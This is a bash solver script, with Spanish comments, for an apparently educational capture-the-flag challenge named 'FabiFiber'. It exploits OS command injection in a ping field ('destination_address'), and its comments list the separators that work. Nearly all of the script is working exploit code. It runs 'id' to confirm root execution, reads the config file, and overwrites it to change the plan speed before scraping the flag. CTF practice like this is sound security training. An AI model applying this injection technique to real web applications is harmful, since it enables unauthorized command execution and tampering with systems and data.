#!/usr/bin/env bash
# Solver de "FabiFiber": OS command injection (como root) en el ping del
# gateway. La velocidad del plan vive en el archivo `config.data` (SPEED=30M);
# se reescribe a 1G y la home re-renderiza con la flag en un banner.
#
#   ./solve.sh https://chl-...-fabifiber.softwareseguro.com.ar
set -euo pipefail

BASE="${1:?Uso: ./solve.sh <URL_BASE>}"

# El campo vulnerable es `destination_address`: se concatena en una shell que
# ejecuta `ping`. Separadores que funcionan: ; | && y salto de linea.
inject() {
  curl -sk "$BASE/" \
    --data-urlencode "destination_address=1.1.1.1; $1" \
    --data-urlencode "count1=1"
}

echo "[1] Confirmando RCE (id)..."
inject 'id' | grep -o 'uid=[^<]*' || true

echo "[2] Leyendo config actual..."
inject 'cat config.data' | grep -o 'SPEED=[^<]*' || true

echo "[3] Subiendo la velocidad a 1 Giga..."
inject 'echo "SPEED=1G" > config.data' >/dev/null

echo "[4] Recargando la home y extrayendo la flag..."
curl -sk "$BASE/" | tr '\n' ' ' | grep -o 'FLAG: [0-9a-f]\{32\}' || \
  echo "No se encontro el banner; revisar manualmente la home."
